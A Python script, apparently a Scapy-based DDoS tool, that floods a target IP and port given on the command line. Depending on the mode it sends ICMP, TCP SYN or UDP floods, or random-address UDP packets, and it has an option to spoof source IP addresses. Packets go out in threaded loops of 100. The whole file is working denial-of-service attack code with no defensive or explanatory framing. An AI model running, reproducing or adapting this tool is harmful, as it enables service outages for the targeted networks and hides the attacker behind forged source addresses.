#!/usr/bin/python3

import logging
import socket
import netifaces
import os
import sys
import random
import concurrent.futures
from scapy.all import *
from threading import *
import queue, time
from time import strftime, localtime, sleep
from uuid import getnode as get_mac

class Attack_Packet:

    def __init__(self, threads, target, code, loop, ip, mac, spoof):
        self._terminate = False
        self._threads_num = threads
        self._target_ip = target.split(":")[0]
        self._target_port = int(target.split(":")[1])
        self._loop = loop
        self._ip = ip
        self._mac = mac
        self._code = code
        self._spoof = spoof

        if (code == 1) :
            self._payload = "ICMP_1234567890" * 50
            if self._spoof:
                self._ip = RandIP()
            # self._packet = Ether(src=self._mac) / fragment(IP(src=self._ip,dst=self._target_ip) / ICMP() / self._payload, fragsize=64)
            self._packet = Ether(src=self._mac) / IP(src=self._ip,dst=self._target_ip) / ICMP() / self._payload
        
        elif (code == 2) :
            self._payload = "SYN_1234567890_" * 50
            if self._spoof:
                self._ip = RandIP()
            self._packet = Ether(src=self._mac) / IP(src=self._ip,dst=self._target_ip) / TCP(sport=RandShort(), dport=self._target_port, flags="S",) / self._payload  #seq=(0, 10), window=random.randint(200, 500))
        
        elif (code == 3) :
            self._payload = "UDP_1234567890" * 50
            if self._spoof:
                self._ip = RandIP()
            self._packet = Ether(src=self._mac) / IP(src=self._ip,dst=self._target_ip) / UDP(sport=RandShort(), dport=self._target_port) / self._payload
        else:
            self._payload = "X" * 75
            self._packet = Ether(src=RandMAC(),dst=RandMAC()) / IP(src=RandIP(),dst=RandIP()) / UDP(sport=RandShort(), dport=RandShort()) / self._payload

    def startAttack(self):
        logging.info("Create Threads")
        print(self._packet.show())
        print(self._packet.summary())
        local_threads_list = []
        for th in range(self._threads_num):
            logging.info("Created Threads : %s\n", th)
            th = Thread(target=self.sendPkt(self._loop))
            th.start()
            local_threads_list.append(th)

        # Terminate threads
        logging.info("Collect Threads for Attack")
        for thread in local_threads_list:
            self._terminate = True
            thread.join()
        time.sleep(0.00001)
        logging.info("Collected Threads for Attack,, Attack completed")

    def sendPkt(self, loop):
        logging.info(
            'Sending Attack, Check status Terminate : %s', self._terminate)
        for i in range(0, loop):
            logging.info('%s of %s', i, loop)
            sendp(self._packet, verbose=True, count=100)
            # sendp(self._packet, verbose=True, count=10)

def get_IP_Address():
    h_name = socket.gethostname()
    
    IP_addres = str(socket.gethostbyname(h_name))
    Priv_ip = get_if_addr(conf.iface)
    
    mac = ':'.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2))
    Priv_mac = get_if_hwaddr(conf.iface)
    
    logging.info("Host Name is: %s", h_name)
    logging.info("Computer IP Address is: %s", IP_addres)
    logging.info("Computer MAC Address is: %s", mac)
    logging.info("Computer IP-2 Address is: %s", Priv_ip)
    logging.info("Computer MAC-2 Address is: %s", Priv_mac)
    
    return IP_addres, mac, Priv_ip, Priv_mac

def PrintOut(_packet):
    logging.info("Packet Show()")
    logging.info('\n'+str(_packet.show()))
    logging.info("\nPacket Summary()")
    logging.info('\n'+str(_packet.summary()))
    logging.info("Packet Command()")
    logging.info('\n'+str(_packet.command()))

    print("Packet Show()")
    print('\n'+str(_packet.show()))
    print("\nPacket Summary()")
    print('\n'+str(_packet.summary()))
    print("Packet Command()")
    print('\n'+str(_packet.command()))
    return

def prepare(threads, target, code, loop, spoof):
    obj = None
    Priv_ip = get_if_addr(conf.iface)
    Priv_mac = get_if_hwaddr(conf.iface)
    try:
        obj = Attack_Packet(threads, target, code, loop, Priv_ip, Priv_mac, spoof)
    except:
        obj = None
    return obj

def streamTime():
    tmp = strftime('%c', localtime())
    return tmp

if __name__ == "__main__":
    logfile = '/tmp/ScapyDDoS_' + str(streamTime()) + '.log'
    format = "%(asctime)s - %(levelname)s %(name)s [line %(lineno)d] >> %(threadName)s (%(thread)d): %(message)s"
    logging.basicConfig(filename=logfile, format=format, level=logging.INFO,datefmt="%d-%b-%y %H:%M:%S")

    logging.info("Logfile \" %s \" Created", logfile)
    myIP, myMAC, myIP2, myMAC2 = get_IP_Address()

    threads = sys.argv[1]
    threads = int(threads)
    target = sys.argv[2]  # '192.168.1.1:443'
    type_ = sys.argv[3]  # '1-10,2-20,3-30' 
    spoof = sys.argv[4]

    logging.info("init Threads : %s", threads)
    logging.info("init Target : %s", target)
    logging.info("init Type_ : %s", type_)

    target_ip = target.split(":")[0]
    target_port = int(target.split(":")[1])
    schedule = type_.split(",")
    Each_schedule = [es.split("-") for es in schedule]
    if spoof.lower() == "true":
        spoof = True
    else:
        spoof = False

    logging.info("init target_ip : %s", target_ip)
    logging.info("init target_port : %s", target_port)
    logging.info("init schedule : %s", schedule)
    logging.info("init Each_schedule : %s", Each_schedule)
    logging.info("init Spoof : %s", spoof)

    t = []
    c = []
    threads_list = []

    for i in Each_schedule:
        t.append(int(i[0]))
        c.append(int(i[1]))

    # input ke Queue
    jobs = Each_schedule 
    globalQueue = queue.Queue(maxsize=len(jobs))

    for job in jobs:
        globalQueue.put(prepare(threads, target, int(job[0]), int(job[1]), spoof))

    # ambil isi globalQueue
    while not globalQueue.empty():
        _todo = globalQueue.get()
        logging.info("get todo : %s", _todo)
        if _todo == None:
            logging.info("todo is none")
            break
        elif _todo != None:
            logging.info("todo : %s", _todo)
            _todo.startAttack()

    sleep(5)
    sys.exit(0)
